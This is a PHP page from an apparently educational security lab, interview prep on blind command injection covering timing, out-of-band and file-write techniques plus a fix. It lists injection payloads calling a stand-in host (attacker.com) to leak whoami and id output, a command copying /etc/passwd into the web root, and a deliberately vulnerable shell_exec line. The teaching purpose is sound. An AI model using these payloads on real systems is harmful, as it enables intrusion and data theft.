<?php
require_once __DIR__ . '/includes/helpers.php';
$page_title = 'Interview Prep — Blind Command Injection';
$lab_id = 'cmd_c3';
include __DIR__ . '/includes/header.php';
?>
<div class="interview-page">

  <div style="margin-bottom:8px;">
    <a href="/cmd_c3.php" class="btn btn-ghost btn-sm">&larr; Back to Lab C3</a>
  </div>

  <h1>Blind Command Injection</h1>
  <p class="subtitle">Interview prep for Lab C3 — exploitation without visible output.</p>

  <!-- 30-Second Answer -->
  <div class="interview-section">
    <h2>30-Second Answer</h2>
    <div class="thirty-sec">
      "Blind command injection is when the injected command executes but its output is never returned. Confirmation requires side-channels: timing (sleep), OOB (DNS/HTTP callbacks), or writing output to an accessible path."
    </div>
  </div>

  <!-- Common Interview Questions -->
  <div class="interview-section">
    <h2>Common Interview Questions</h2>

    <div class="qa-item">
      <input type="checkbox" class="answer-toggle" id="q1">
      <label class="qa-question" for="q1">How do you exploit command injection with no visible output?</label>
      <div class="qa-answer">
        Three primary methods:<br><br>
        <strong>Time-based:</strong> Inject <code>; sleep 5</code> — if the response takes 5+ seconds longer than baseline, execution is confirmed. No output needed.<br><br>
        <strong>Out-of-band (OOB):</strong> Inject <code>; curl http://attacker.com/$(whoami)</code> or a DNS query like <code>; nslookup $(id).attacker.com</code>. The attacker's server logs the callback, proving execution and leaking data.<br><br>
        <strong>File write:</strong> Inject <code>; cp /etc/passwd /var/www/html/out.txt</code> to write sensitive files to the web root, then fetch them via HTTP. This requires knowing a writable web-accessible path.
      </div>
    </div>

    <div class="qa-item">
      <input type="checkbox" class="answer-toggle" id="q2">
      <label class="qa-question" for="q2">What's the difference between command injection and code injection?</label>
      <div class="qa-answer">
        Command injection runs OS commands in a shell process. Code injection executes within the application's own runtime (e.g. <code>eval()</code>). Both achieve RCE, but at different layers. Blind variants exist for both — the "blind" aspect refers to output not being reflected, not to the injection layer.
      </div>
    </div>

    <div class="qa-item">
      <input type="checkbox" class="answer-toggle" id="q3">
      <label class="qa-question" for="q3">How do you confirm blind injection without OOB infrastructure?</label>
      <div class="qa-answer">
        Time-based confirmation requires no external infrastructure. Measure your baseline response time, then inject <code>; sleep 5</code>. A 5-second delay confirms execution. For data exfiltration without OOB, look for writable paths within the web root (upload directories, log files, temp paths that are served) and write your payload output there.
      </div>
    </div>

    <div class="qa-item">
      <input type="checkbox" class="answer-toggle" id="q4">
      <label class="qa-question" for="q4">How do you fix blind command injection?</label>
      <div class="qa-answer">
        Identical to standard command injection — the blind aspect is about detection difficulty, not a different vulnerability class. Fix: avoid shell commands; use native library functions. If unavoidable, use <code>escapeshellarg()</code> on every argument plus strict allowlist validation. Blind injection is just as critical as reflected — sometimes harder to detect in code review.
      </div>
    </div>
  </div>

  <!-- Dev Fix -->
  <div class="interview-section">
    <h2>Dev Fix</h2>
    <p>The feedback form should log to a file using native PHP file functions — no shell needed. If logging external data, validate and sanitize before writing.</p>
    <div class="terminal" style="margin-top:12px;">
      <span class="comment">// Wrong — name goes into a shell, output suppressed</span><br>
      <span style="color:var(--red);">shell_exec("echo " . $_POST['name'] . " >> /tmp/feedback.log");</span><br><br>
      <span class="comment">// Correct — native PHP file append, no shell</span><br>
      <span style="color:var(--accent);">$entry = date('c') . " | " . mb_substr($_POST['name'], 0, 100) . "\n";<br>
file_put_contents('/tmp/feedback.log', $entry, FILE_APPEND | LOCK_EX);</span>
    </div>
  </div>

  <!-- One-liners to Remember -->
  <div class="interview-section">
    <h2>One-Liners to Remember</h2>
    <div class="oneliner">; sleep 5</div>
    <div class="oneliner">; curl http://attacker.com/$(whoami)</div>
    <div class="oneliner">; cp /etc/passwd /var/www/html/out.txt</div>
    <div class="oneliner">; nslookup $(id).attacker.com</div>
  </div>

  <!-- Red Flags -->
  <div class="interview-section">
    <h2>Red Flags (Things NOT to Say)</h2>
    <div class="red-flag-item">
      <span>&#9888;</span>
      <span><strong>"Blind injection is safe because there's no output"</strong> — output suppression changes detection difficulty, not exploitability. Timing and OOB channels fully bypass the lack of reflection.</span>
    </div>
  </div>

  <div style="text-align:center;margin-top:48px;">
    <a href="/cmd_c3.php" class="btn btn-primary">Back to Lab C3 &rarr;</a>
  </div>
</div>
<?php include __DIR__ . '/includes/footer.php'; ?>
